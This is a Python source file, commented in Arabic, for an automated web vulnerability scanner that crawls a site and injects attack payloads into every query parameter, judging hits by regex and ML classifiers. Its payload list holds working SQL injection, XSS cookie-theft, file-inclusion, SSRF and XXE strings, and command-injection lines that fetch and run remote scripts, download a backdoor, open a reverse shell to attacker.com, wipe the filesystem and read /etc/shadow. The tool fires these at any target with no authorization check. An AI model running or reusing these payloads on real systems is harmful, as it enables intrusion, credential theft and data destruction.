import re
from collections import deque
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

import joblib
import requests
from bs4 import BeautifulSoup

from utils import logger

# تعريف مستويات الخطورة لأنواع الثغرات
SEVERITY_LEVELS = {
    "SQLi": "عالي جداً",
    "XSS": "متوسط",
    "LFI": "عالي",
    "Command Injection": "عالي جداً",
    "SSRF": "عالي",
    "XXE": "عالي"
}

# حمولات محدثة لأنواع الثغرات
payloads = {
    "SQLi": [
        "' OR '1'='1'-- -",
        "' UNION SELECT NULL,username,password FROM users--",
        "1' AND 1=IF(SUBSTR(@@version,1,1)='5',BENCHMARK(5000000,SHA1(1)),0)--",
        "1; SELECT LOAD_FILE('/etc/passwd')--",
        "1' OR EXISTS(SELECT * FROM information_schema.tables) AND '1'='1"
    ],
    "XSS": [
        "<script>alert(document.cookie)</script>",
        "'\"><img src=x onerror=alert(1)>",
        "<svg onload=location='javascript:alert`1`'>",
        "javascript:eval('ale'+'rt(1)')",
        "<body style=\"background:url('javascript:alert(1)')\">"
    ],
    "LFI": [
        "../../../../etc/passwd%00",
        "....//....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "file:///etc/passwd",
        "/proc/self/environ"
    ],
    "Command Injection": [
        "; curl https://malicious.com/exploit.sh | sh",
        "| wget https://malicious.com/backdoor -O /tmp/bd",
        "`ncat -e /bin/bash attacker.com 4444`",
        "$(sudo rm -rf /)",
        "'; cat /etc/shadow #"
    ],
    "SSRF": [
        "http://localhost/admin",
        "http://169.254.169.254/latest/meta-data/",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
        "dict://127.0.0.1:22/info"
    ],
    "XXE": [
        "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"data:text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg\"> %xxe;]>"
    ]
}

# أنماط للكشف عن الثغرات في الاستجابات
response_patterns = {
    "SQLi": [
        r"You have an error in your SQL syntax",
        r"Warning: mysqli",
        r"Unclosed quotation mark",
        r"Microsoft OLE DB Provider",
        r"ODBC Driver"
    ],
    "XSS": [
        r"<script>alert\(document\.cookie\)</script>",
        r"<img src=x onerror=alert\(1\)>"
    ],
    "LFI": [
        r"root:.*:0:0:",
        r"bin:.*:1:1:",
        r"daemon:.*:2:2:",
        r"syslog"
    ],
    "Command Injection": [
        r"bin.*lib.*etc",
        r"root:.*:0:0:",
        r"Could not resolve host",
        r"Connection timed out"
    ],
    "SSRF": [
        r"EC2Metadata",
        r"InstanceInfo",
        r"Metadata Service"
    ]
}

def load_ml_models():
    """تحميل نماذج الذكاء الاصطناعي"""
    try:
        model_bin = joblib.load("model_binary.pkl")
        model_multi = joblib.load("model_multi.pkl")
        vectorizer = joblib.load("vectorizer.pkl")
        return model_bin, model_multi, vectorizer
    except Exception as e:
        logger.error(f"خطأ في تحميل النماذج: {str(e)}")
        return None, None, None


# تحميل النماذج عند بدء التشغيل
model_bin, model_multi, vectorizer = load_ml_models()

def analyze_response(response, payload_type):
    """تحليل الاستجابة للكشف عن أنماط الثغرات"""
    detection_signs = []
    if response.status_code >= 400:
        detection_signs.append(f"كود خطأ: {response.status_code}")

    # البحث عن الأنماط في محتوى الاستجابة
    for pattern in response_patterns.get(payload_type, []):
        if re.search(pattern, response.text, re.IGNORECASE):
            detection_signs.append(f"تم اكتشاف نمط: {pattern}")

    # تحليل توقيت الاستجابة
    if response.elapsed.total_seconds() > 3:
        detection_signs.append(f"تأخير غير طبيعي: {response.elapsed.total_seconds()} ثواني")

    return detection_signs


def extract_links(base_url, max_pages=20):
    """استخراج جميع الروابط من الموقع مع تحديد عمق الزحف"""
    domain = urlparse(base_url).netloc
    visited = set()
    queue = deque([base_url])
    all_links = set()

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    })

    while queue and len(visited) < max_pages:
        url = queue.popleft()
        if url in visited:
            continue

        try:
            response = session.get(url, timeout=10, allow_redirects=True)
            visited.add(url)

            # تحليل HTML لاستخراج الروابط
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href']

                # تجاهل الروابط غير المرغوب فيها
                if href.startswith('javascript:') or href.startswith('mailto:'):
                    continue

                # جعل الرابط مطلقاً
                absolute_url = urljoin(url, href)
                parsed = urlparse(absolute_url)

                # تصفية الروابط خارج النطاق
                if parsed.netloc == domain:
                    # تجاهل الروابط بدون معلمات
                    if parsed.query:
                        all_links.add(absolute_url)

                    # إضافة الروابط إلى قائمة الانتظار للزحف
                    if absolute_url not in visited:
                        queue.append(absolute_url)

        except Exception as e:
            logger.error(f"خطأ في جلب الرابط {url}: {str(e)}")

    return list(all_links)


def analyze_url_web(url: str):
    """تحليل شامل للرابط لاكتشاف الثغرات الأمنية"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    report = {
        "vulnerabilities": [],
        "tested_params": {},
        "stats": {"total_tests": 0, "vulnerable": 0}
    }

    if not query_params:
        return report

    # إنشاء جلسة لتحسين الأداء
    with requests.Session() as session:
        for vuln_type, pl_list in payloads.items():
            for param in query_params:
                for payload in pl_list:
                    # إنشاء نسخة من المعلمات مع الحمولة
                    test_params = query_params.copy()
                    test_params[param] = [payload]
                    encoded_query = urlencode(test_params, doseq=True)

                    # إعادة بناء الرابط
                    from urllib.parse import urlunparse
                    test_url = urlunparse(parsed._replace(query=encoded_query))
                    report["stats"]["total_tests"] += 1

                    try:
                        response = session.get(
                            test_url,
                            timeout=10,
                            headers={
                                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
                            },
                            allow_redirects=False
                        )

                        # التحليل باستخدام الذكاء الاصطناعي
                        combined = f"{test_url} GET {param} {payload} {response.text[:500]}"
                        vector_input = vectorizer.transform([combined])
                        is_vuln = model_bin.predict(vector_input)[0] if model_bin else False
                        vuln_name = model_multi.predict(vector_input)[0] if model_multi and is_vuln else vuln_type

                        # تحليل الاستجابة يدوياً
                        detection_signs = analyze_response(response, vuln_type)

                        # تسجيل النتائج
                        test_result = {
                            "param": param,
                            "payload": payload,
                            "status": response.status_code,
                            "vulnerable": is_vuln or bool(detection_signs),
                            "type": vuln_name,
                            "detection_signs": detection_signs,
                            "url": test_url,
                            "test_count": 1
                        }

                        if test_result["vulnerable"]:
                            # التحقق إذا كانت الثغرة موجودة مسبقاً
                            existing_vuln = next((v for v in report["vulnerabilities"]
                                                  if v["type"] == vuln_name and v["param"] == param), None)

                            if existing_vuln:
                                existing_vuln["test_count"] += 1
                                existing_vuln["detection_signs"].extend(d for d in detection_signs
                                                                        if d not in existing_vuln["detection_signs"])
                            else:
                                report["vulnerabilities"].append(test_result)
                                report["stats"]["vulnerable"] += 1

                    except Exception as e:
                        logger.error(f"فشل الاختبار: {str(e)}")
                        report["stats"]["total_tests"] -= 1  # تراجع العداد

    return report
